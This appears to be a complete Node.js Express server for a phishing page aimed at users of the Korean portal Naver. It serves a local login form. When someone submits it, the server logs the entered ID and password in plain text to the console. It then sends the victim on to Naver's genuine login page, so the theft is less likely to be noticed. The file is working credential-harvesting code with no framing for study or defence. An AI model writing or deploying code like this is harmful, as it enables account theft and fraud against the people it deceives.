const express = require('express');
const app = express();
const path = require('path');
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res, next) => {
    res.sendFile(path.join(__dirname + '/index.html'));
});

app.post('/login', (req, res, next) => {
    const id = req.body.id;
    const pw = req.body.pw;
    res.redirect('https://nid.naver.com/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com');
    console.log("ID:", id, "/", "Password:", pw);
});

app.listen(5831);
